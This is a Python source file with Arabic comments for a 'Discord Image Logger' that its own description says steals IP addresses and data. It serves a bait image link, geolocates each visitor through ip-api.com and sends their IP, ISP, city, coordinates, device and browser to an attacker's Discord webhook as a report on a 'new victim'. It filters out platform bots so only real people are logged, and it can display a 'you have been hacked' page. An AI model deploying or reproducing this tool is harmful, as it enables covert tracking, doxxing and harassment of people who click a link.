# مسجل صور ديسكورد - نسخة عربية كاملة
# معدل بواسطة كولن لأجل البقاء على قيد الحياة

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "مسجل صور ديسكورد"
__description__ = "تطبيق بسيط يسرق الآي بي والبيانات باستخدام خاصية Open Original في ديسكورد"
__version__ = "v2.0 عربي معدل"
__author__ = "كولن"

config = {
    "webhook": "WEBHOOK HERE !",
    "image": "IMAGE HERE !",
    "imageArgument": True,

    "username": "مسجل الصور العربي",
    "color": 0x00FFFF,

    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": True,
        "message": "<h1 style='color:red;font-size:50px;text-align:center;margin-top:45vh;font-family:Arial'>تم اختراقك تماماً ☠️<br>كل بياناتك معانا دلوقتي</h1>",
        "richMessage": False,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")): return "Discord"
    elif useragent.startswith("TelegramBot"): return "Telegram"
    else: return False

def reportError(error):
    requests.post(config["webhook"], json={"username": config["username"],"content": "@everyone","embeds": [{"title": "مسجل الصور - خطأ","color": config["color"],"description": f"حصل خطأ أثناء تسجيل الآي بي!\n\n**الخطأ:**\n```\n{error}\n```"}]})

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs): return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={"username": config["username"],"content": "","embeds": [{"title": "تم إرسال الرابط","color": config["color"],"description": f"رابط المسجل اتبعت في شات!\nهيجيلك آي بي قريب\n\n**الرابط:** `{endpoint}`\n**الآي بي:** `{ip}`\n**المنصة:** `{bot}`"}]})
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"]:
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""

    if info["hosting"]:
        if config["antiBot"] in [3,4]: return
        if config["antiBot"] == 2 and not info["proxy"]: ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "تم صيد ضحية جديدة بنجاح",
            "color": config["color"],
            "description": f"""**الضحية فتحت الصورة الأصلية!**

**الرابط:** `{endpoint}`

**بيانات الضحية:**
> **الآي بي:** `{ip if ip else 'غير معروف'}`
> **مزود الإنترنت:** `{info['isp'] if info['isp'] else 'غير معروف'}`
> **الدولة:** `{info['country'] if info['country'] else 'غير معروف'}`
> **المنطقة:** `{info['regionName'] if info['regionName'] else 'غير معروف'}`
> **المدينة:** `{info['city'] if info['city'] else 'غير معروف'}`
> **الإحداثيات:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
> **المنطقة الزمنية:** `{info['timezone'].split('/')[-1].replace('_', ' ') if '/' in info['timezone'] else info['timezone']}`
> **جوال:** `{info['mobile']}`
> **في بي إن:** `{info['proxy']}`
> **بوت:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'محتمل' if info['hosting'] else 'لا'}`

**جهاز الضحية:**
> **النظام:** `{os}`
> **المتصفح:** `{browser}`

**يوزر أيجنت:**
```{useragent}```
""",
            "thumbnail": {"url": url} if url else None
        }]
    }
    requests.post(config["webhook"], json=embed)
    return info

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = base64.b64decode((dic.get("url") or dic.get("id") or "").encode()).decode(errors="ignore") if dic.get("url") or dic.get("id") else config["image"]

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]

            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
                return

            makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

            data = config["message"]["message"].encode()

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html;charset=utf-8')
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
